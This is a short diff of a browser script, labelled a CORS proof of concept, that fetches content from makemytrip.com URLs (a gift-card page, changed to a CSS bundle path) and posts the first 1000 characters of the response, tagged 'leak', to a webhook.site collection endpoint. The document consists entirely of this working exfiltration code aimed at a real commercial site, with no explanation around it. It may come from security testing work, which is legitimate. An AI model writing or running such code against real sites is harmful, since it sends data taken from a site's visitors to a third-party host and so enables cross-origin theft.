@@ -1,19 +1,15 @@
 <script>
-fetch("https://www.makemytrip.com/gift-cards/?popup=addgc", {
+fetch("https://www.makemytrip.com/apos-frontend/releases/Zhvy2kfRqOk7H0zojGVP4Zwwq2WCIpNr/default/public-bundle.css/", {
   method: "GET",
-  mode: "cors" // no credentials
+  mode: "cors"
 })
 .then(res => res.text())
 .then(body => {
   fetch("https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8", {
     method: "POST",
-    headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({
-      leak: body.slice(0, 1000)
-    })
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ leak: body.slice(0, 1000) }) // adjust slice as needed
   });
 })
-.catch(err => console.error("PoC error:", err));
+.catch(err => console.error("CORS PoC Error:", err));
 </script>
